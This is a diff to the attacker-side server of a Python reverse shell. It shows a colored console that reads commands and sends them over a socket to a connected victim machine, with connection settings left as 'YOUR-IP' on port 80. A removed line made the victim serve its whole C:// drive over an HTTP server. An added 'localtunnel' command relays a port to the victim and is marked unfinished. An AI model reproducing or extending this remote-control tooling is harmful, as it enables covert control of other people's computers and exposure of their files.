@@ -2,13 +2,11 @@ import socket, colorama
 from os import system
 from colorama import Fore as f
 
-""" This is the file that you should run before someone executes the __main__.py script (to accept the connection) """
-
 class VARIABLES:
     """ Connection variables for socket """
     serverip  = "YOUR-IP" # your server/host ip
     port      = 80 # port to connect to
-    buffer    = 1024 # buffer to send (in bytes) each packet
+    buffer    = 1024 # buffer to send (in bytes)
 
 class C:
     """ Program colors """
@@ -43,7 +41,7 @@ class Server:
         {C.ENDC}[{C.CYAN}*{C.ENDC}] help @~
             {C.RED}->{C.ENDC} help - this message
             {C.RED}->{C.ENDC} clearlog - clears console
-            {C.RED}->{C.ENDC} pythonserver - starts http server
+            {C.RED}->{C.ENDC} localtunnel <port> - starts http tunnel ({C.RED}NOT DONE YET{C.ENDC})
             {C.RED}->{C.ENDC} exit - quits reverse shell
         """)
 
@@ -66,18 +64,17 @@ class Server:
         while True:
             print(f"{C.RED}{cwd} {C.CYAN}$> {C.RED}", end="")
             command = input()
-
+            split_command = command.split()
             if command.lower() == "help":
                 self.HelpMenu()
                 continue
             elif command.lower() == "clearlog":
                 self.Banner()
                 continue
-            elif command.lower() == "pythonserver":
-                """ I'm going to make a HTTP tunnel function soon """
+            elif split_command[0] == "localtunnel":
+                """ Currently working on http tunnelling with js and http.server """
                 print(C.ENDC)
-                client_socket.send("python -m http.server --bind localhost --directory C:// 80".encode())
-                print(f"[{C.CYAN}+{C.ENDC}] Python HTTP server started on localhost port {C.RED}80{C.ENDC} !\n")
+                client_socket.send(f"localtunnel {split_command[1]}".encode())
                 continue
 
             elif command.lower() == "exit":
